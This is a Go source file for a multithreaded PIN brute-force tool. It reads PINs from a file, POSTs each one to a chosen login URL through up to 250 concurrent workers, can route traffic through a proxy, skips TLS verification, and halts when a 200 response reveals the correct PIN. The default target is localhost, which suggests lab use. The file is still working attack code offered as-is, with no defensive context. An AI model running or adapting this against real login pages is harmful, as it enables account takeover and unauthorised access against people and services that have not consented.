package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func promptInput(prompt string, defaultValue string) string {
	reader := bufio.NewReader(os.Stdin)

	if defaultValue != "" {
		fmt.Printf("%s [%s]: ", prompt, defaultValue)
	} else {
		fmt.Printf("%s: ", prompt)
	}

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	if input == "" {
		return defaultValue
	}

	return input
}

func main() {
	startTime := time.Now()

	// Command-line flags
	argURL := flag.String("url", "", "Target URL")
	argProxy := flag.String("proxy", "", "Proxy connection string (optional)")
	argFile := flag.String("file", "", "PIN file name")
	argThreads := flag.String("threads", "", "Concurrency/Threads count")
	flag.Parse()

	var targetURL, proxyString, pinFile, concurrencyStr string

	// CLI mode
	if *argURL != "" && *argFile != "" && *argThreads != "" {
		fmt.Println("=== Launching via Automated Command-Line Arguments ===")

		targetURL = *argURL
		proxyString = *argProxy
		pinFile = *argFile
		concurrencyStr = *argThreads

	} else {
		// Interactive mode
		fmt.Println("=== Go Brute-Force Interactive Configuration ===")

		targetURL = promptInput(
			"Enter Target URL",
			"http://127.0.0.1:3000/login",
		)

		proxyString = promptInput(
			"Enter Proxy Connection String (leave blank for none)",
			"",
		)

		pinFile = promptInput(
			"Enter PIN File Name",
			"pins.txt",
		)

		concurrencyStr = promptInput(
			"Enter Concurrency/Threads",
			"250",
		)
	}

	// Parse thread count
	concurrency, err := strconv.Atoi(concurrencyStr)
	if err != nil {
		fmt.Println("[!] Invalid thread count, defaulting to 150")
		concurrency = 150
	}

	timeoutHeader := 5 * time.Second

	// HTTP transport
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        concurrency,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
	}

	// Optional proxy
	if strings.TrimSpace(proxyString) != "" {
		proxyURL, err := url.Parse(proxyString)
		if err != nil {
			fmt.Printf("[!] Error parsing proxy URL: %v\n", err)
			return
		}

		transport.Proxy = http.ProxyURL(proxyURL)

		fmt.Println("[+] Proxy enabled")
	} else {
		fmt.Println("[+] Running without proxy")
	}

	// HTTP client
	client := &http.Client{
		Transport: transport,
		Timeout:   timeoutHeader,
	}

	// Open file
	file, err := os.Open(pinFile)
	if err != nil {
		fmt.Printf("[!] Error opening file: %v\n", err)
		return
	}
	defer file.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	jobs := make(chan string, concurrency)

	var wg sync.WaitGroup
	var totalChecked uint64

	fmt.Printf("\n[+] Target: %s\n", targetURL)
	fmt.Printf("[+] File: %s | Threads: %d\n", pinFile, concurrency)

	if proxyString != "" {
		fmt.Printf("[+] Proxy: %s\n", proxyString)
	} else {
		fmt.Printf("[+] Proxy: Disabled\n")
	}

	fmt.Printf("[+] Processing queue...\n\n")

	// Start workers
	for w := 1; w <= concurrency; w++ {
		wg.Add(1)

		go worker(
			ctx,
			cancel,
			client,
			targetURL,
			jobs,
			&wg,
			&totalChecked,
		)
	}

	// Feed jobs
	scanner := bufio.NewScanner(file)

readLoop:
	for scanner.Scan() {

		select {
		case <-ctx.Done():
			break readLoop
		default:
		}

		pin := strings.TrimSpace(scanner.Text())

		if pin == "" {
			continue
		}

		select {
		case jobs <- pin:
		case <-ctx.Done():
			break readLoop
		}
	}

	close(jobs)

	wg.Wait()

	elapsed := time.Since(startTime)

	fmt.Printf(
		"\n[+] Run closed down. Evaluated %d entries total.\n",
		atomic.LoadUint64(&totalChecked),
	)

	fmt.Printf("[+] Time elapsed: %s\n", elapsed)
}

func worker(
	ctx context.Context,
	cancel context.CancelFunc,
	client *http.Client,
	targetURL string,
	jobs <-chan string,
	wg *sync.WaitGroup,
	totalChecked *uint64,
) {
	defer wg.Done()

	for {
		select {

		case <-ctx.Done():
			return

		case pin, ok := <-jobs:
			if !ok {
				return
			}

			atomic.AddUint64(totalChecked, 1)

			// Proper form encoding
			data := url.Values{}
			data.Set("pin", pin)

			payload := []byte(data.Encode())

			req, err := http.NewRequestWithContext(
				ctx,
				"POST",
				targetURL,
				bytes.NewBuffer(payload),
			)

			if err != nil {
				continue
			}

			req.Header.Set(
				"Content-Type",
				"application/x-www-form-urlencoded",
			)

			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("User-Agent", "Go-Client/1.0")

			resp, err := client.Do(req)

			if err != nil {

				if ctx.Err() == nil {
					fmt.Printf(
						"[ DROP ] PIN=%s ERROR=%v\n",
						pin,
						err,
					)
				}

				continue
			}

			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()

			if err != nil {
				continue
			}

			fmt.Printf(
				"[ REQ ] PIN=%s STATUS=%s BODY=%q\n",
				pin,
				resp.Status,
				string(body),
			)

			// SUCCESS CONDITION
			if resp.StatusCode == 200 {

				fmt.Printf("\n\n[============ MATCH FOUND ============]\n")
				fmt.Printf("[+] Target PIN Identified: %s\n", pin)
				fmt.Printf("[+] Response Status: %s\n", resp.Status)
				fmt.Printf("[+] Response Body: %s\n", string(body))
				fmt.Printf("[=====================================]\n\n")

				// Stop all workers immediately
				cancel()

				return
			}
		}
	}
}
